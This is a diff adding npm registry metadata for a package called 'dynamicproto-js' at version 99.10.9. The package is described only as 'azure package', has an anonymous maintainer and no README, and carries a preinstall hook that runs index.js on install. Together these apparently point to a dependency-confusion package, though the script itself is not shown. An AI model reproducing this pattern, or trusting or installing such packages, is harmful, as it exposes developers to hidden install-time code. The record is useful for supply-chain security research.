@@ -1,0 +1,62 @@
+{
+    "_id": "dynamicproto-js",
+    "name": "dynamicproto-js",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "dynamicproto-js",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "dynamicproto-js@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-wA9sB0wb73yGpp+yh7DkzdDVPGcgiqtGNKW5LvO+qgKEomr1RxeeYztseXQuJkQ603FdOgy7ebsMlXVMbZOfhw==",
+                "shasum": "f90aa4985b8ccc661e631ab633bca5ced6dd6cb0",
+                "tarball": "https://registry.npmjs.org/dynamicproto-js/-/dynamicproto-js-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5067,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiOwMmACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2Vmpqkg/9GJxkX9YRLCUBoecxwcKz28KOcugwNhffJL0uYv9p35rHu/y4\r\nhfAys0PSTMHeCOUW9hN7Z7WyWsRXC1GyU01N/nbEtEYS/OFLBlIy9byitx1p\r\npMtQxVRsObairdDHIcpjvTWB716DF1gNm3ZoGtnEECgS8q+HpxJKxCrdGaz8\r\nYKoXQEKMDFke7OTtf/8tTNm7XyI4WTtRhZK5zfkXhEtuVRblSlLCmBl4i+Bv\r\nq/clVdt8R33Yoat/ZW5SK7sqdKf3s9QPSYw++eUaKpADAb/QEaSI5qQPhch8\r\ny4jMM7MDaikquhWvY7LFbnteWVs7AseqGUuI35a02EoWLdTdowNmsp2CL43i\r\na7PSMHieDHvcr7+xoujVvzJWILlf1zmo28sdMB3eMGJq8hyMhnL8t4gYUgmx\r\neUT5J643bCbLnOQdXfQjHLCqlSaUeo0h/7O/8G0sAWNw568FaZrm8w5bKpEX\r\n6BKq8S6G4k2SJBDD1dsvEx3wOqTe0eGAomFrs+aW0GJCgMfjxZXuZGD8Sc/T\r\n47ddxIQIEWym3e9XhUvVmRgBMHyFgCthTvoikUl8K7wPtqNCUR20s4Roig1T\r\nlroVjWGkkub2+emuNb86MSnT33GtER/hpEoE+QhUgBrfxLzcrHkDSRwzR4kd\r\n4ua+v9+fWNpip9xvqUtp271SUEYq/1ccTHA=\r\n=Y71H\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "yx4kzdkr",
+                "email": "yx4kzdkr@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "yx4kzdkr",
+                    "email": "yx4kzdkr@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/dynamicproto-js_99.10.9_1648034598200_0.3305731243076402"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-23T11:23:18.200Z",
+        "99.10.9": "2022-03-23T11:23:18.355Z",
+        "modified": "2022-03-23T11:23:18.472Z"
+    },
+    "maintainers": [
+        {
+            "name": "yx4kzdkr",
+            "email": "yx4kzdkr@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
